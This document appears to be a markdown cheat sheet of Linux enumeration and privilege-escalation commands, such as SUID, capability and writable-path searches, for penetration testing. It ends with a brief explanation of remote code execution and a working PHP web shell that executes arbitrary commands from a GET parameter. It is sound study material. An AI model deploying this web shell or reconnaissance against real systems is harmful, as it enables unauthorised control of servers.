# Useful linux commands for the cyber security

## Enumeration
### System Information
- `hostname`
- `uname -a`
- `cat /proc/version`
- `cat /etc/issue`

### Process Information
- `ps`
- `ps -A`
- `ps axjf`
- `ps aux`

### Environment Information
- `env`

### Sudo Privileges
- `sudo -l`

### File and Directory Information
- `ls`
- `ls -la`

### User and Privilege Information
- `id`
- `cat /etc/passwd`

### Command History
- `history`

### Network Information
- `ifconfig`
- `ip route`
- `netstat`
  - `netstat -a`
  - `netstat -at`
  - `netstat -au`
  - `netstat -l`
  - `netstat -s`
  - `netstat -tp`
  - `netstat -ano`
  - `netstat -i`

### File Search
- `find . -name <filename>`
- `find /home -name <filename>`
- `find / -type d -name <directory_name>`
- `find / -type f -perm 0777`
- `find / -perm a=x`
- `find /home -user <username>`
- `find / -mtime <days>`
- `find / -atime <days>`
- `find / -cmin -<minutes>`
- `find / -amin -<minutes>`
- `find / -size <size>`
- `find / -size +<size>`
- `find / -size -<size>`

### Finding the SUID/SGID Bits (P)
- `find / -type f -perm -04000 -ls 2>/dev/null` (Privilege Escalation)

### Shows Capabilities
- `getcap -r / 2>/dev/null` (Privilege Escalation)

### Shows Running Cron Jobs
- `cat /etc/crontab` (Privilege Escalation)

### Insecure $PATH vulnerability
- `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` (Privilege Escalation)

# Exploitation techniques
## Remote Code Execution (RCE)
- RCE: Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.
- Web shell: A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.

- Simple web shell:
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>```

